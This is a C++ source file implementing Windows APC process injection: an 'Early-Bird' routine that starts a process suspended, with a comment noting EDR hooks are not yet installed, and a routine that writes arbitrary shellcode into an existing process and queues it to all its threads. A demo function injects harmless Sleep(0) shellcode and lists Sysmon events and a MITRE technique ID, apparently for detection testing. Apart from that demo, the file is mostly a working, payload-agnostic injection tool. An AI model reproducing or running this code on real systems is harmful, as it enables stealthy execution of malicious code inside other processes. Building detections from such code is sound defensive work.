#include "APCInject.h"
#include <tlhelp32.h>

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE,PVOID,PVOID,PVOID,PVOID);

static pNtQueueApcThread GetNtQueueApc() {
    return (pNtQueueApcThread)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
}

// ── Early-Bird APC injection ──────────────────────────────────────────────────

DWORD APCInject::EarlyBird(const char* targetExe, const BYTE* shellcode, SIZE_T scSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // Create target process suspended — no EDR hooks installed yet
    if (!CreateProcessA(NULL, (LPSTR)targetExe, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi))
        return 0;

    // Allocate RWX memory in target process
    PVOID remote = VirtualAllocEx(pi.hProcess, NULL, scSize,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return 0;
    }

    // Write shellcode
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remote, shellcode, scSize, &written)) {
        VirtualFreeEx(pi.hProcess, remote, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return 0;
    }

    // Queue APC to the main thread — fires before entry point on resume
    auto NtQueueApc = GetNtQueueApc();
    if (NtQueueApc) {
        NtQueueApc(pi.hThread, remote, NULL, NULL, NULL);
    } else {
        // Fallback: QueueUserAPC
        QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
    }

    // Resume — APC fires first, shellcode runs, then real entry point
    ResumeThread(pi.hThread);
    DWORD pid = pi.dwProcessId;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return pid;
}

// ── Inject into existing process via APC (all threads) ───────────────────────

std::string APCInject::InjectExisting(DWORD pid, const BYTE* shellcode, SIZE_T scSize) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return "APCInject: OpenProcess(" + std::to_string(pid) + ") failed";

    PVOID remote = VirtualAllocEx(hProc, NULL, scSize,
                                   MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) { CloseHandle(hProc); return "APCInject: VirtualAllocEx failed"; }

    SIZE_T written;
    WriteProcessMemory(hProc, remote, shellcode, scSize, &written);

    // Queue to every thread — at least one will enter alertable wait eventually
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    int queued = 0;
    if (hSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { sizeof(te) };
        if (Thread32First(hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID != pid) continue;
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    QueueUserAPC((PAPCFUNC)remote, hThread, 0);
                    CloseHandle(hThread);
                    queued++;
                }
            } while (Thread32Next(hSnap, &te));
        }
        CloseHandle(hSnap);
    }
    CloseHandle(hProc);
    return "APCInject: queued APC to " + std::to_string(queued) + " thread(s) in PID " +
           std::to_string(pid) + "\n"
           "Shellcode at remote addr 0x" + [&](){
               char buf[32]; snprintf(buf,sizeof(buf),"%llX",(DWORD64)remote); return std::string(buf);
           }() + "\n"
           "Note: thread must enter alertable wait (SleepEx, WaitForSingleObjectEx, etc.) to fire.";
}

// ── Demo: inject a no-op shellcode to verify code path ───────────────────────
// The demo shellcode just calls Sleep(0) and returns — harmless, but exercises
// the full injection path so your detection system can log the events.

std::string APCInject::Demo(const char* targetExe) {
    // x64 shellcode: call Sleep(0) then ret
    // 48 31 C9          xor rcx, rcx   (arg=0)
    // 48 B8 xx..xx      mov rax, Sleep
    // FF D0             call rax
    // C3                ret
    BYTE sc[16] = {
        0x48, 0x31, 0xC9,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xD0,
        0xC3
    };
    DWORD64 sleepAddr = (DWORD64)(void*)Sleep;
    memcpy(sc + 5, &sleepAddr, 8);

    DWORD pid = EarlyBird(targetExe, sc, sizeof(sc));
    if (!pid) return "APCInject demo: EarlyBird failed (check path: " + std::string(targetExe) + ")";
    return "APCInject demo: early-bird APC injected into " + std::string(targetExe) +
           " PID=" + std::to_string(pid) + "\n"
           "The shellcode calls Sleep(0) and returns — process continues normally.\n"
           "Detection events to look for:\n"
           "  Sysmon EID 1  (process create: " + std::string(targetExe) + ")\n"
           "  Sysmon EID 8  (CreateRemoteThread / QueueAPC)\n"
           "  Sysmon EID 10 (process access: VirtualAllocEx + WriteProcessMemory)\n"
           "MITRE T1055.004 — Asynchronous Procedure Call";
}
